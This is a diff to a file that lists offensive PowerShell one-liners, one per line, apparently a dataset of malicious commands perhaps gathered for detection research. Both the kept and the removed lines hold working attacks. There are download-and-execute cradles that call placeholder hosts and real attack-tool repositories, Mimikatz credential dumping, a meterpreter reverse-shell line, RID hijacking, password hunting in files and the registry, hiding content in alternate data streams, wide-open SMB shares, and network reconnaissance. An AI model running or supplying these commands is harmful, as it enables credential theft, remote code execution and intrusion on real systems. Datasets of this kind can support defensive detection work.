@@ -6,17 +6,13 @@ ls -recurse ; get-childitem -recurse ; gci -recurse
 $Invoke = {IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/malicious_script.ps1')}; Invoke-Command -ScriptBlock $Invoke
 powershell -exec bypass -command "Invoke-Mimikatz -DumpCreds"
 powershell.exe -c "Get-CimInstance -class win32_operatingsystem | select -property * | export-csv msdebug.log"
-powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');"
+powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1');"
 Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')"
 Invoke-WebRequest -Url http://malicious-server.com/malicious-file.exe -OutFile C:\malicious-file.exe
-Invoke-RIDHijacking -User alice -RID 500
-$Bypass = New-Object System.Management.Automation.PSBypass; $Bypass.AddScript("Invoke-Mimikatz -DumpCreds"); $Bypass.Invoke()
+Invoke-RIDHijacking -User unina -RID 500
 powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString('http://evilurl.com/evil.ps1'))";
 powershell -ep bypass -c "Invoke-Mimikatz"
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
-Invoke-NinjaCopy -Path 'C:\windows\clrt\clrt.dit' -LocalDestination 'C:\windows\temp\clrt.dit'
-Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.1.1 -Lport 443
-$command = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')"; Invoke-Command -ScriptBlock { Invoke-Expression $using:command }
 Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')"
 powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://malicious-website.com/malicious.ps1')"
 Get-BrowserInformation -Browser All -Datatype History -UserName Luca -Search 'wikipedia'
@@ -35,13 +31,12 @@ $pattern = "password";$hives = "HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_US
 $originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); InvokeExpression $decodedString
 iex(iwr("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1"));Get-PassHashes
 Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'
-$path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path
 netsh interface portproxy add v4tov4 listenport=5446 listenaddress=10.35.8.17 connectport=5985 connectaddress=10.35.8.23
-gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
+gci $pwd -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
 Find-DomainShare -CheckShareAccess
 $net = "10.10.1.";0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace("\s+","").replace("`r","").replace("`n"," "); Write-Output "$net$_ $r"} | tee ip_hostname.txt
 new-item "c:\users\public\share" -itemtype directory;New-SmbShare -Name "sharedir" -Path "C:\users\public\share" -FullAccess "Everyone","Guests","Anonymous Logon"
-$content = 'Invoke-Mimikatz'; $file = 'C:\temp\normal.txt'; $stream = 'C:\temp\normal.txt:hidden'; SetContent -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; GetContent -Path $stream
+$content = 'Invoke-Mimikatz'; $file = 'C:\normal.txt'; $stream = 'C:\normal.txt:hidden'; Set-Content -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; Get-Content -Path $stream
 ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
 $path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path
 Get-ForestGlobalCatalog
